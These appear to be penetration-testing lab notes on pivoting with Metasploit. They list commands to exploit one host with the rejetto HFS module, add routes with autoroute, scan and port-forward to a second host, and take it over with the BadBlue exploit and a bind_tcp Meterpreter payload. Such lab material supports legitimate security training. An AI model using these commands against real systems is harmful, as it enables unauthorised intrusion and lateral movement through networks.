## Pivoting
* Meterpreter provides the ability to add a network route to the internal network's subnet, perform port forwarding and consequnetly scan and exploit other systems on the network.

## Port forwarding
* The process of redirecting traffic from a port on a target system to a port on attackers' system.

* PRACTICAL
* To exploit victim 1:
* `use exploit/windows/http/rejetto_hfs_exec`
* We can check which systems are present on the same network via: `ipconfig`
* To access victim 2 from victim 1, we need to add a route:
  * `run autoroute -s [IPv4 address value without specifying the last bit, instead putting a zero, like 10.0.29.0/20]`
  * `run autoroute -p` --> To see active routing tables
  * This will enable us to attack any system on the same network using MSF.
 
* `background`
* As we can access the victim2 machine only from the inside of the msfconsole, so we cannot exit it, thus we have  to find a way to scan the ports on victim2 from within of msfconsole:
  * `use auxiliary/scanner/portscan/tcp`
  * After running this, we can see that there is a service running on port 80, but we cannot figure out without running nmap scan that which service is running  on this port.
  * To accomplish this we will use Port Forwarding
 
* **Port Forwarding**
  * Go back to meterpreter session
  * `sessions 1`
  * `portfwd add -l 1234 -p 80 -r [victim2 IP]`
  * where -l = Local port,, -p == remote port
 
* Now on a new terminal:
* `nmap -sV -p 1234 localhost`
* Now whatever service it will show on the port 1234, that would be the service running on victim2.

* Now again going back to the terminal with msfconsole:
* `use exploit/windows/http/badblue_passthru`
* `set payload windows/meterpreter/bind_tcp`
* `set rhosts [victim2]`
* `exploit` --> Meterpreter session on victim2
